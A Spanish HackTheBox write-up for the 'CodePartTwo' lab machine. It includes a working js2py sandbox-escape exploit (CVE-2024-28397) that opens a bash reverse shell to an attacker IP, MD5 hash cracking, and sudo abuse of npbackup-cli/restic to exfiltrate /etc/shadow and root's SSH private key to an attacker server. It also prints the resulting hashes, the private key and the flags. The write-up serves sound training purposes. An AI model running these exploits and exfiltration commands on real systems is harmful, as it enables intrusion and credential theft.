---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# CodePartTwo HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 10:04 EDT
Nmap scan report for 10.10.11.82
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `8000` que contiene una pagina web por lo que podemos ver, por lo que vamos a entrar dentro del mismo.

Dentro veremos una pagina web normal y corriente, no veremos nada interesante, pero si le damos a `Download App` veremos que nos descarga un zip llamado `app.zip`, si lo descomprimimos veremos la siguiente arquitectura de carpetas:

```
total 28
drwxrwxr-x 5 root root 4096 Sep  1 09:33 .
drwxr-xr-x 3 root root 4096 Sep 19 10:08 ..
-rw-r--r-- 1 root root 3679 Sep  1 09:33 app.py
drwxrwxr-x 2 root root 4096 Jan 16  2025 instance
-rw-rw-r-- 1 root root   49 Jan 16  2025 requirements.txt
drwxr-xr-x 4 root root 4096 Oct 26  2024 static
drwxr-xr-x 2 root root 4096 Sep  1 09:32 templates
```

Veremos que la pagina es un servidor de `python3` con `Flask` u otro tipo de libreria, por lo que vemos tambien es un `dump` de la propia pagina, vamos a investigar mas a fondo a ver que encontramos ya que podremos ver el codigo fuente de la pagina y con ello ver alguna vulnerabilidad.

> app.py

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

Vemos que hay una vulnerabilidad en la version de una libreria llamada `js2py` en el `requirements.txt`:

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

Si empezamos a buscar informacion de dicha vulnerabilidad, veremos el siguiente `CVE`:

URL = [js2py 0.74 CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

Por lo que vemos se puede realizar un `RCE` mediante codigo de `JS`, por lo que vamos a registrarnos en la pagina ya que podemos, y despues una vez autenticados veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-19 164832.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos ejecutar codigo de `JS` y todo lo que ejecutemos se muestra en un `output` mas abajo, tambien podemos guardar el codigo, por lo que vamos aprovechar dicha vulnerabilidad para pegar el siguiente codigo:

```js
var cmd = "bash -c \"wget http://<IP>/\"";
var a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
var obj = a(a(a, "__class__"), "__base__");

function findpopen(o) {
    for (var i in o.__subclasses__()) {
        var item = o.__subclasses__()[i];
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if (item.__name__ != "type") {
            var result = findpopen(item);
            if (result) {
                return result;
            }
        }
    }
    return null;
}

var popen_class = findpopen(obj);
if (popen_class) {
    var result = popen_class(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    result;
} else {
    "No se encontró Popen";
}
```

Con esto en la pagina vamos a probar que realmente se estan ejecutando comandos, por lo que vamos abrir un servidor de `python3`:

```shell
python3 -m http.server 80
```

Y ahora si le damos a `Run Command` veremos esto en la pagina:

```
Error: 'NoneType' object is not callable
```

Pero si volvemos a donde tenemos el servidor de `python3`:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.82 - - [19/Sep/2025 11:09:57] "GET / HTTP/1.1" 200 -
```

Veremos que ha funcionado realmente por detras, por lo que vamos a crear un `exploit` para ejecutarlo y que nos proporcione una `reverse shell` de esta forma:

> exploit.py

```python
import requests
import json

# CONFIGURACIÓN - MODIFICA ESTOS VALORES
TARGET_URL = 'http://<IP>:8000'           # URL del servidor vulnerable
ATTACKER_IP = '<IP_ATTACKER>'             # Tu IP de atacante
ATTACKER_PORT = '<PORT>'                  # Puerto para la reverse shell

# Comando para reverse shell (bash)
reverse_shell_cmd = f'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'

# Codificar en base64 para evitar problemas de comillas
import base64
encoded_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()
final_cmd = f'echo {encoded_cmd} | base64 -d | bash'

# Código JavaScript que se ejecutará en el servidor
js_code = f"""
var cmd = "{final_cmd}";
var a = Object.getOwnPropertyNames({{}}).__class__.__base__.__getattribute__;
var obj = a(a(a, "__class__"), "__base__");

function findpopen(o) {{
    for (var i in o.__subclasses__()) {{
        var item = o.__subclasses__()[i];
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item;
        }}
        if (item.__name__ != "type") {{
            var result = findpopen(item);
            if (result) {{
                return result;
            }}
        }}
    }}
    return null;
}}

var popen_class = findpopen(obj);
if (popen_class) {{
    var result = popen_class(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    result;
}} else {{
    "No se encontró Popen";
}}
"""

# Preparar y enviar la solicitud
url = f'{TARGET_URL}/run_code'
payload = {"code": js_code}
headers = {"Content-Type": "application/json"}

print(f"[+] Enviando payload a {TARGET_URL}")
print(f"[+] Reverse shell hacia {ATTACKER_IP}:{ATTACKER_PORT}")
print(f"[+] Comando: {reverse_shell_cmd}")

try:
    r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
    print(f"[+] Respuesta del servidor: {r.status_code}")
    print(f"[+] Contenido: {r.text}")
except requests.exceptions.RequestException as e:
    print(f"[-] Error de conexión: {e}")
except Exception as e:
    print(f"[-] Error inesperado: {e}")
```

Vamos a ponernos a la escucha antes de ejecutarlo:

```shell
nc -lvnp <PORT>
```

Ahora vamos a ejecutarlo de esta forma:

```shell
python3 exploit.py
```

Info:

```
[+] Enviando payload a http://10.10.11.82:8000
[+] Reverse shell hacia 10.10.14.85:7755
[+] Comando: bash -i >& /dev/tcp/10.10.14.85/7755 0>&1
[-] Error de conexión: HTTPConnectionPool(host='10.10.11.82', port=8000): Read timed out. (read timeout=10)
```

Si volvemos a donde tenemos la escucha:

```
listening on [any] 7755 ...
connect to [10.10.14.85] from (UNKNOWN) [10.10.11.82] 39374
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ whoami
whoami
app
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user marco

Si recordamos anteriormente en el codigo de `app.py` vimos esta linea:

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
```

Por lo que vamos a realizar una busqueda de `users.db` a ver que vemos:

```shell
find / -name "users.db" 2>/dev/null
```

Info:

```
/home/app/app/instance/users.db
```

Vamos a intentar leerlo con `sqlite3` de esta forma:

```shell
sqlite3 /home/app/app/instance/users.db
```

Dentro de la herramienta con dicho archivo listamos las tablas que pueda tener:

```sql
.tables
```

Info:

```
code_snippet  user
```

Vamos a ver la informacion de `user` que es la mas interesante:

```sql
select * from user;
```

Info:

```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|ezboi|726fc2abe79d325c745210240c13dd89
```

Veremos cosas interesantes entre ellas el usuario `marco` con su contraseña `hasheada`, como vemos que existe a nivel de sistema, vamos a probar a `crackear` dicha contraseña de `marco`.

> hash

```
marco:649c9d65a206a75f5abe509fe128bce5
```

Ahora con `john` haremos lo siguiente:

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (marco)     
1g 0:00:00:00 DONE (2025-09-19 11:35) 7.142g/s 24633Kp/s 24633Kc/s 24633KC/s sweetart098..sweetali786
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a probar dichas credenciales por `SSH` a ver si funcionaran:

### SSH

```shell
ssh marco@<IP>
```

Metemos como contraseña `sweetangelbabylove`...

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 19 Sep 2025 03:35:41 PM UTC

  System load:           0.02
  Usage of /:            58.8% of 5.08GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             241
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.82
  IPv6 address for eth0: dead:beef::250:56ff:fe94:768a


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 19 15:35:41 2025 from 10.10.14.85
marco@codeparttwo:~$ whoami
marco
```

Con esto veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
7c6df9aebd2547bb817bab2e419db71e
```

## Escalate Privileges

Si vemos con el `id` de que grupo somos, veremos lo siguiente:

```
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

Veremos que pertenecemos al grupo llamado `backups`, si listamos el `/opt` veremos esta carpeta que pertenece a dicho grupo:

```
drwxr-x---  2 root backups 4096 Apr  6 00:07 npbackup-cli
```

No veremos nada interesante, si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Vemos que podemos ejecutar el binario `npbackup-cli` como el usuario `root`, por lo que vamos a investigar que hacer dicho binario.

Vemos que hay un archivo de configuracion bastante interesante en esta ruta:

```
-rw-rw-r-- 1 root root 2893 Jun 18 11:16 /home/marco/npbackup.conf
```

Si nosotros cargamos dicho archivo de configuracion con el binario con el que podemos ejecutar como `sudo` para probar a ejecutar comandos, veremos lo siguiente:

```shell
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --raw "whoami"
```

Info:

```
2025-09-19 16:08:39,839 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-19 16:08:39,868 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-19 16:08:39,878 :: INFO :: Running raw command: whoami
unknown command "whoami" for "restic"
2025-09-19 16:08:41,253 :: ERROR :: unknown command "whoami" for "restic"

2025-09-19 16:08:41,254 :: ERROR :: Raw command failed:
unknown command "whoami" for "restic"

2025-09-19 16:08:41,254 :: INFO :: Runner took 1.376973 seconds for raw
2025-09-19 16:08:41,255 :: ERROR :: Backend finished with errors.
2025-09-19 16:08:41,255 :: ERROR :: Operation finished
2025-09-19 16:08:41,261 :: INFO :: ExecTime = 0:00:01.424338, finished, state is: errors.
```

Vemos que por detras esta utilizando el binario `restic`, y como se esta ejecutando como `sudo`, si buscamos en `GTFOBins` veremos lo siguiente:

URL = [GTFOBins restic](https://gtfobins.github.io/gtfobins/restic/#sudo)

Vemos que se puede ejecutar como `sudo` sin que pierda los privilegios del mismo, por lo que podremos realizar un `backup` de cualquier archivo gracias a `restic` y que se esta ejecutando como `root`, pero para ello tendremos que establecer un repo como servidor donde queremos mandarnos dicho `backup`, esto es parecido a la maquina `artificial` de `HTB`.

Vamos a inicializar un repositorio y un servidor de `restic` en nuestra maquina atacante de esta forma:

```shell
go install github.com/restic/rest-server/cmd/rest-server@latest
export PATH=$PATH:$(go env GOPATH)/bin
mkdir /opt/restic-repos
rest-server --path /opt/restic-repos --no-auth --listen :6666
```

Info:

```
Data directory: /opt/restic-repos
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:6666
```

Con esto ya vamos a tener nuestro servidor a la escucha, ahora vamos a inicializar un repo en dicho servidor de dicha ruta establecida:

```shell
snap install restic --classic
/snap/bin/restic init -r "rest:http://<IP>:6666/Pwn3d"
```

Metemos como contraseña lo que queramos, en mi caso puse `diseo` y con esto se nos creara nuestro repo llamado `Pwn3d`, ahora desde la maquina victima nos vamos a pasar el archivo `/etc/shadow`.

Primero como el repo va con contraseña, vamos a crear un archivo con la contraseña en texto plano para posteriormente pasarsela a la herramienta:

```shell
echo "diseo" | tee /tmp/restic-password > /dev/null
chmod 777 /tmp/restic-password
```

Ahora habiendo creado este archivo, vamos a utilizarlo como contraseña para realizar la conexion a nuestro servidor del atacante y que nos realice un `backup` del archivo `shadow` de esta forma:

```shell
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --raw "backup -r 'rest:http://<IP_ATTACKER>:6666/Pwn3d' --password-file /tmp/restic-password /etc/shadow"
```

Info:

```
2025-09-19 16:29:01,251 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-19 16:29:01,282 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-19 16:29:01,294 :: INFO :: Running raw command: backup -r 'rest:http://10.10.14.85:6666/Pwn3d' --password-file /tmp/restic-password /etc/shadow
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            1 new,     0 changed,     0 unmodified
Added to the repository: 2.027 KiB (1.210 KiB stored)

processed 1 files, 1.339 KiB in 0:00
snapshot 8ba0bb36 saved
2025-09-19 16:29:04,211 :: INFO :: Successfully run raw command:
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            1 new,     0 changed,     0 unmodified
Added to the repository: 2.027 KiB (1.210 KiB stored)

processed 1 files, 1.339 KiB in 0:00
snapshot 8ba0bb36 saved

2025-09-19 16:29:04,212 :: INFO :: Runner took 2.919008 seconds for raw
2025-09-19 16:29:04,212 :: INFO :: Operation finished
2025-09-19 16:29:04,219 :: INFO :: ExecTime = 0:00:02.970154, finished, state is: success.
```

Ahora vamos a comprobar las `snapshots` a ver si nos llego bien, en la maquina atacante haremos lo siguiente:

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Pwn3d" snapshots
```

Metemos la contraseña establecida del repo....

Info:

```
repository adeef797 opened (repository version 2) successfully, password is correct
ID        Time                 Host         Tags        Paths
-------------------------------------------------------------------
8ba0bb36  2025-09-19 12:29:02  codeparttwo              /etc/shadow
-------------------------------------------------------------------
1 snapshots
```

Con esto vemos que ha funcionado, por lo que vamos a exportarlo para verlo en texto plano y ver que realmente es el archivo de la maquina victima.

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Pwn3d" restore 8ba0bb36 --include /etc/shadow --target /tmp
```

Info:

```
repository adeef797 opened (repository version 2) successfully, password is correct
restoring <Snapshot 8ba0bb36 of [/etc/shadow] at 2025-09-19 16:29:02.381437431 +0000 UTC by root@codeparttwo> to /tmp
```

Ahora vamos a leerlo de esta forma:

```shell
cat /tmp/etc/shadow
```

Info:

```
root:$6$UM1RuabUYlt5BQ5q$ZtzAfYOaCaFxA8MGbyH1hegFpzQmJrpIkx7vEIKvXoVl830AXAx1Hgh8r11GlpXgY25LK8wF76nvQYQ1wLSn71:20104:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:20010:0:99999:7:::
sshd:*:20010:0:99999:7:::
systemd-coredump:!!:20016::::::
marco:$6$i5xRI7UVqeBITIby$NQKHXVvAWz7Vl3QkEwgxw0ItF9Lwen4gGCBi.YYiDQTdkgcPABaqfmBzheAM/9JA/9J7szqDzPaIDbkNqc.0V.:20022:0:99999:7:::
lxd:!:20016::::::
app:$6$5iH3Zik78QR8t9Se$bgRAig/YjbMzwOTFME629sLrrTn2avVD9pLFwz0X2zBTz0LYfNIEuw6w5s53NNu2K7IeEJK4D6j9PB6SR.UvC0:20022:0:99999:7:::
mysql:!:20026:0:99999:7:::
_laurel:!:20256::::::
```

Vemos que efectivamente ha funcionado, por lo que vamos a probar a obtener la clave `PEM` del usuario `root` a ver si existiera, haciendo el mismo proceso anterior.

```shell
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --raw "backup -r 'rest:http://<IP>:6666/Pwn3d' --password-file /tmp/restic-password /root/.ssh/id_rsa"
```

Info:

```
2025-09-19 16:39:24,343 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-19 16:39:24,375 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-19 16:39:24,386 :: INFO :: Running raw command: backup -r 'rest:http://10.10.14.85:6666/Pwn3d' --password-file /tmp/restic-password /root/.ssh/id_rsa
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repository: 3.570 KiB (3.470 KiB stored)

processed 1 files, 2.541 KiB in 0:00
snapshot f17a625d saved
2025-09-19 16:39:27,431 :: INFO :: Successfully run raw command:
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repository: 3.570 KiB (3.470 KiB stored)

processed 1 files, 2.541 KiB in 0:00
snapshot f17a625d saved

2025-09-19 16:39:27,433 :: INFO :: Runner took 3.047177 seconds for raw
2025-09-19 16:39:27,433 :: INFO :: Operation finished
2025-09-19 16:39:27,439 :: INFO :: ExecTime = 0:00:03.098817, finished, state is: success.
```

Veremos que aparentemente si ha funcionado, por lo que vamos a ver las `snapshots` y exportarlo para ver dicho archivo.

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Pwn3d" snapshots
```

Info:

```
repository adeef797 opened (repository version 2) successfully, password is correct
ID        Time                 Host         Tags        Paths
-------------------------------------------------------------------------
8ba0bb36  2025-09-19 12:29:02  codeparttwo              /etc/shadow
f17a625d  2025-09-19 12:39:25  codeparttwo              /root/.ssh/id_rsa
-------------------------------------------------------------------------
2 snapshots
```

Veremos que nos llego bien, ahora vamos a exportarlo:

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Pwn3d" restore f17a625d --include /root/.ssh/id_rsa --target /tmp
```

Info:

```
repository adeef797 opened (repository version 2) successfully, password is correct
restoring <Snapshot f17a625d of [/root/.ssh/id_rsa] at 2025-09-19 16:39:25.522790289 +0000 UTC by root@codeparttwo> to /tmp
```

Ahora vamos a leer dicho archivo a ver si todo fue bien:

```shell
cat /tmp/root/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Veremos que ha funcionado, vamos a utilizar dicha `clave` para conectarnos con el usuario `root`, por `SSH` de esta forma:

### SSH

```shell
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Info:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 19 Sep 2025 04:44:21 PM UTC

  System load:           0.0
  Usage of /:            57.6% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             228
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.82
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2fdc


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 19 16:44:21 2025 from 10.10.14.85
root@codeparttwo:~# whoami
root
```

Veremos que ya seremos el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
b0b3c7dd5f13d2f4eb09180411c8bc10
```
